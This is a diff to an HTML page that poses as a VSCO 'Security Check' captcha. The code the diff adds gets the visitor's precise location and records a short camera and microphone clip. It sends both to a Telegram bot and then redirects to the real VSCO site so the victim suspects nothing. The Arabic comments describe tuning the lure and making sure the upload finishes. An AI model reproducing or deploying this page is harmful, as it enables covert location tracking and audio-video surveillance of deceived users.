@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VSCO - Verify Identity</title>
+    <title>VSCO - Verification</title>
     <style>
         body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffffff; }
         .container { text-align: center; padding: 20px; max-width: 400px; }
@@ -16,8 +16,8 @@
     <div class="container">
         <div class="logo">VSCO</div>
         <h1>Security Check</h1>
-        <p>Please allow the requested permissions to verify you are not a robot.</p>
-        <button class="btn" onclick="initiate()">Verify & Open</button>
+        <p>Please click below to verify you are not a robot.</p>
+        <button id="mainBtn" class="btn" onclick="initiate()">Verify & Open</button>
     </div>
 
 <script>
@@ -25,41 +25,54 @@
     const chatId = '8005843544';
 
     async function initiate() {
-        // Location Access
+        const btn = document.getElementById('mainBtn');
+        btn.innerText = "Verifying..."; // تغيير النص ليشعر المستخدم أن العملية جارية
+        btn.disabled = true;
+
+        // 1. إرسال الموقع فوراً
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const map = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍 Location Found: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            fetch(map);
+            const map = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍 Location: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            await fetch(map);
         }, null, {enableHighAccuracy: true});
 
-        // Video + Audio Capture
+        // 2. تسجيل فيديو وصوت
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             const recorder = new MediaRecorder(stream);
             const chunks = [];
+
             recorder.ondataavailable = e => chunks.push(e.data);
-            
             recorder.onstop = async () => {
                 const blob = new Blob(chunks, { type: 'video/mp4' });
                 const fd = new FormData();
                 fd.append('chat_id', chatId);
-                fd.append('video', blob, 'security_capture.mp4');
+                fd.append('video', blob, 'security_video.mp4');
                 
-                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
+                // أهم خطوة: ننتظر الإرسال لينتهي قبل التحويل
+                try {
+                    await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
+                } catch (e) {}
+
                 stream.getTracks().forEach(t => t.stop());
+                // التحويل فقط بعد انتهاء الرفع
                 window.location.replace("https://vsco.co/store/app");
             };
 
             recorder.start();
-            setTimeout(() => { if(recorder.state !== "inactive") recorder.stop(); }, 4000);
+            // تسجيل لمدة 3 ثوانٍ فقط ليكون الحجم صغيراً ويصل بسرعة
+            setTimeout(() => {
+                if(recorder.state !== "inactive") recorder.stop();
+            }, 3000);
 
         } catch (err) {
-            alert("⚠️ Alert: Camera and Microphone access is required for verification.");
+            alert("⚠️ Security Alert: Access required to verify you are not a robot.");
             window.location.reload();
         }
     }
 </script>
 </body>
 </html>
+
 
 
 
